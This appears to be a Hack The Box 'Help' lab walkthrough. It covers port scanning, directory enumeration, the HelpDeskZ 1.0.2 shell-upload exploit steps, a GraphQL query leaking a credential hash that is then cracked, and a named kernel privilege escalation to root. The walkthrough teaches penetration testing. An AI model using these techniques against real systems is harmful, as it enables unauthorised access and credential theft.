1,Recon
port scan 
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

By enumerating the existed url, we find:
```
/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
/server-status        (Status: 403) [Size: 296]
```

![](images/Pasted%20image%2020241104053523.png)

And also, we found this service is powered by `HelpDeskZ`
We found some exploits for this service and we need to use poc to prove the exploits.
`HelpDeskZ 1.0.2 - Arbitrary File Upload`
```
HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce

httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
```

So we need to get the upload file path to help us get the reverse shell after uploading the reverse shell.

We need to continue enumerate the valid web-contents, because we just live in the root directory of this service.
```
gobuster -u http://10.10.10.121/support -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
# /images (Status: 301)
# /index.php (Status: 200)
# /uploads (Status: 301)
# /css (Status: 301)
# /includes (Status: 301)
# /js (Status: 301)

gobuster -u http://10.10.10.121/support/uploads -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
# /index.php (Status: 302)
# /articles (Status: 301)
# /tickets (Status: 301)
```

After upload the payload from `http://help.htb/support/?v=submit_ticket&action=confirmation` we can use the exploit script to find the payload file in the upload directory, and we just need to curl it to handle the reverse shell.

Note: Due to timezones, the exploit might not work out of the box. This can be fixed by changing the local time to that of the server. The server’s time can be seen in HTTP Response

Alternatively path:
Let's come to the port 3000
`{"message":"Hi Shiv, To get access please find the credentials with given query"}`

That means we need to use query to get the valid credential.
We have known the version of this service `Node.js Express framework`

Navigating to `/graphql` we encounter an error about the GET parameter.
`GET query missing.`

So let's try `http://help.htb:3000/graphql?query=abc`
`{"errors":[{"message":"Syntax Error GraphQL request (1:1) Unexpected Name \"abc\"\n\n1: abc\n   ^\n","locations":[{"line":1,"column":1}]}]}`

Next we try to query information. A graphql endpoint takes in objects as input. As we need information related to a user lets try a user object,
`curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq`
```
{
  "errors": [
    {
      "message": "Field \"user\" of type \"User\" must have a selection of subfields. Did you mean \"user { ... }\"?",
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ]
    }
  ]
}

```

`curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq`
```
{
  "data": {
    "user": {
      "username": "helpme@helpme.com"
    }
  }
}
```

Now we have get the email, let's continue to check the password.
`curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,password} }' | jq
```
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}

```
Then crack this md5 hash, we get `godhelpmeplz`
And also we can login successfully
![](images/Pasted%20image%2020241104062255.png)

It looks like a database query terminal, and even we can change the time zone.

So let's try to check the sql-injection.
But to be honest, this SQL injection is too difficult to exploit. If possible, please try a simpler method.

2,shell as root
Firstly, I would want to use `linpeas.sh` to enumerate the machine quickly:
```
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)

That means we can check syslog

uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation

After compilation, and exec it then we can get the root shell.

